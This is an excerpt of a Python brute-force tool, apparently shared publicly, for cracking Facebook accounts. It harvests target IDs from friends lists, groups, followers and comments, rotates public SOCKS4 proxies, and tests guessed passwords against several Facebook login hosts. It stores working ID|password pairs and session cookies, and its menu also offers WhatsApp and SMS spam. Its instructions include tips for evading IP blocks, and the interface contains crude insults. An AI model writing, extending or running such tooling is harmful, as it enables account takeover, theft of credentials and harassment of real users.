# [+] TERSERAH LO MAU DI RECORDE APA KAGAK🗿👆
# [+] ESCE BY ZAENAL XD
#------------------[ IMPORT MODULE ]-------------------#
...
from concurrent.futures import ThreadPoolExecutor as ZaenalXD
...
sys.stdout.write('\x1b]2; NGECREK | ZaenalXD Multi Brute Facebook\x07')
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari Zaenal Ramdani');exit()
...
def login_lagi334():
	try:
		cetak(nel('Disarankan Untuk Menggunakan Cookie Yang Masih Fresh Untuk Melakukan Crack Account',width=90,style=f"bold red"))
				...
				if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
					...
					if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
						...
						if 'Sukses!' in str(response6):
							...
							os.system("xdg-open https://instagram.com/zaenal_ramdani19_?igshid=MzNlNGNkZWQ4Mg==")
							print("\n [+] Login Berhasil | python ZaenalXD.py");followdong()
			except Exception as e:
				print(" [+] Cookies Mokad NGABs")
...
def menu(my_name,my_id):
	...
	cetak(panel(f"[bold white]gunakan script sebaik mungkin jika ada,apa-apa author tidak bertanggung jawab!",width=90,title=f"[bold red]Warning",style=f"bold red"))
	cetak(panel(f"[bold white][[bold cyan]01[bold white]] Crack From Friends     [bold white][[bold cyan]06[bold white]] Crack From Username[bold white]      [[bold cyan]11[bold white]] Get Headers      \n[bold white][[bold cyan]02[bold white]] Crack From Massal      [bold white][[bold cyan]07[bold white]] Crack From Followers     [[bold cyan]12[bold white]] Spam WhatsApp      \n[bold white][[bold cyan]03[bold white]] Crack From Groups      [[bold cyan]08[bold white]] Crack From Comment       [bold white][[bold cyan]13[bold white]] Spam Sms \n[bold white][[bold cyan]04[bold white]] Crack From Email       [bold white][[bold cyan]09[bold white]] Check Opsi Checkpoint [bold white]   [[bold cyan]14[bold white]] Dump Id \n[bold white][[bold cyan]05[bold white]] Crack From Files       [bold white][[bold cyan]10[bold white]] [bold white]Check Result Crack [bold white]      [[bold cyan]15[bold white]] [bold red]Delete Cookies",width=90,title=f"[bold red]List Menu",style=f"bold red"))
	_____zaenal___xd____ = input(f' [+] Pilih Menu Crack : ')
	if _____zaenal___xd____ in ['1','01']:
		zaenal_dump()
	elif _____zaenal___xd____ in ['2','02']:
		dump_massal()
	elif _____zaenal___xd____ in ['3','03']:
		crack_group()
	elif _____zaenal___xd____ in ['4','04']:
		crack_email()
	elif _____zaenal___xd____ in ['5','05']:
		crack_file()
	elif _____zaenal___xd____ in ['6','06']:
		crack_nama()
	elif _____zaenal___xd____ in ['7','07']:
		pengikut()
	elif _____zaenal___xd____ in ['8','08']:
		komen()
	elif _____zaenal___xd____ in ['9','09']:
		file_cp()
	elif _____zaenal___xd____ in ['10']:
		result()
	elif _____zaenal___xd____ in ['11']:
		siu()
	elif _____zaenal___xd____ in ['12']:
		spam_wa()
	elif _____zaenal___xd____ in ['13']:
		spam_sms()
	elif _____zaenal___xd____ in ['14']:
		dumpid()
	elif _____zaenal___xd____ in ['15']:
...
def crack_group():
	try:
		...
		time.sleep(5)
		login()
	cetak(nel(' Pastikan Idz Grup Bersifat Publik , Mohon Bersabar Dump Id Grup Sangat Lambat',width=90,style=f"bold red"))
...
def crack_email():
	...
	blk = ['tika','milla','ilham','gabriel','lala','cans','nayla','pandi','miftah','kurnia','sinta','nadia','gadis','anggun','amoy','anna']
	global ok , cp
	cetak(nel(f'Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold red"))
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	cetak(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Lihat Hasil OK[/]           [bold white][[bold cyan]02[/][bold white]][/] [bold white]Lihat Hasil CP[/]',width=90,padding=(0,11),title=f"[bold white][/][bold green]List Menu Cek[/][bold red][/]",style=f"bold red"))
	kz = input(f' [+] Pilih : ')
	if kz in ['2','02']:
...
def setting():
	...
	if hu in ['1','01']:
		...
		exit()
	urut = []
	urut.append(panel(f'[bold white][[bold cyan]01[/][bold white]][/] [bold white]Login Site [bold green]m.facebook.com[bold white] [/]\n[bold white][[bold cyan]02[/][bold white]][/] [bold white]Login Site [bold green]mbasic.facebook.com[bold white]',width=42,title=f"[bold green]Validate",style=f"bold red"))
	urut.append(panel(f'[bold white][[bold cyan]03[/][bold white]][/] [bold white]Login Site [bold green]reguler.facebook.com[bold white] [/]\n[bold white][[bold cyan]04[/][bold white]][/] [bold white]Login Site [bold green]graph.facebook.com[bold white]',width=42,title=f"[bold green]Reguler And B-Api[bold white]",style=f"bold red"))
	urut.append(panel(f'[bold white][[bold cyan]05[/][bold white]][/] [bold white]Login Site [bold green]async.facebook.com[bold white] [/]\n[bold white][[bold cyan]06[/][bold white]][/] [bold white]Login Site [bold green]m.alpha.facebook.com[bold white] ',width=42,title=f"[bold green]Alpha And Async",style=f"bold red"))
	urut.append(panel(f'[bold white][[bold cyan]07[/][bold white]][/] [bold white]Login Site [bold green]x.facebook.com[bold white] [/]\n[bold white][[bold cyan]08[/][bold white]][/] [bold white]Login Site [bold green]d.facebook.com[bold white] ',width=42,title=f"[bold green]Old Metode",style=f"bold red"))
...
[bold white][[bold cyan]03[bold white]] [bold white]Menggunakan Password Manual [[bold red]Not Recommended[bold white]]''',style='bold red',title='[bold green]Setting Password',padding=(0,8),width=90))
	...
	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Aplikasi Yang Terkait Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Setting Cek Apk",style=f"bold red"))
	_zaenal_ = input(' [+] Pilih : ')
	if _zaenal_ in ['']:
		print(' [+] Pilih Yang Bener Kontol ')
		exit()
	elif _zaenal_ in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
		
	cetak(panel(f'      [bold white]Apakah Anda Ingin Menampilkan Opsi Checkpoint Di Dalam Akun ? Y/T',width=90,title=f"[bold green]Cek Opsi",style=f"bold red"))
	_zaenal_ = input(' [+] Pilih : ')
	if _zaenal_ in ['']:
		print(' [+] Pilih Yang Bener Kontol ')
		exit()
	...
	cetak(panel(f'[bold white]Apakah Anda Ingin Mengunakan User-Agent Manual Untuk Melakukan Crack Account ? Y/T',width=90,title=f"[bold green]Setting User-Agent",style=f"bold red"))
...
def passwrd():
	...
	cetak(panel(f'\t[bold white]On/Off Mode Pesawat Setiap 300 Idz Agar Terhindar Dari Spam Ip',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold red"))
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='ZaenalXD-CP')
					cetak(statuscp1)
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, width=90, style='bold green', title='ZaenalXD-OK')
					cetak(statusok1)
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Zaenal-CP')
					cetak(statuscp1)
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					break
...
def opsi():
	...
	prints(Panel(f""" Hidupkan Mode Pesawat Selama 10 Detik""",width=90,style=f"bold red"))
